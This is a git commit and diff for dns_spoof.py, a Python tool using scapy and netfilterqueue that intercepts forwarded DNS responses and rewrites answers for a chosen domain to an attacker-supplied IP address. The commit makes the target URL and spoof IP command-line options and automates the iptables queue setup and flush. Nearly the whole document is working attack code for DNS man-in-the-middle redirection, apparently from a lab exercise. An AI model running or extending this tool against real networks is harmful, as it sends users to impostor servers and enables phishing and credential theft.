736df0399134eeef2e351c38ec76371acc21c04e
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-08-24 17:06:50 -0400

    Lots of changes
    Added a way to accept input so that the url and web server that will be spoofed is dynamic
    Initialized the IP tables so that it doesn't need to be run before you start running the program
    At an interruption signal, added the auto functionality to reset the ip tables back to how they were and clear out the queue created to capture and forward packets

--- dns_spoof.py
+++ dns_spoof.py
@@ -1,6 +1,10 @@
 #!/usr/bin/env python
 import netfilterqueue
 import scapy.all as scapy
+import time
+import os
+import sys
+import optparse
 
 #iptables -I FORWARD -j NFQUEUE --queue-num 0
 #this is the place where packets are included by default as they flow through the computer
@@ -17,13 +21,25 @@ import scapy.all as scapy
 #DNSQR - DNS Question Record
 #DNSRR - DNS Resource Record
 
+def get_arguments():
+    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
+    parser = optparse.OptionParser()
+    parser.add_option("-u", "--url", dest="url", help="URL to Spoof")
+    parser.add_option("-s", "--spoof", dest="spoof", help="Spoofed IP")
+    (options, arguments) = parser.parse_args()
+    if not options.url:
+        parser.error("[-] Please specify the URL you want to spoof. Use --help for more info.")
+        if not options.spoof:
+            parser.error("[-] Please specify the IP of your spoofed server. Use --help for more info.")
+    return options
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "vulnweb.com" in qname:
+        if options.url in qname:
             print("[+] Spoofing target")
-            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
+            answer = scapy.DNSRR(rrname=qname, rdata=options.spoof)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
@@ -36,6 +52,14 @@ def process_packet(packet):
         #print(scapy_packet.show())
     packet.accept()
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
-queue.run()
+options = get_arguments()
+
+
+try:
+    while True:
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(0, process_packet)
+        queue.run()
+except KeyboardInterrupt:
+    print("\n[+] Detected CTRL + C .......... Flushing IP Tables .......... Please wait. \n")
+    os.system("iptables --flush")
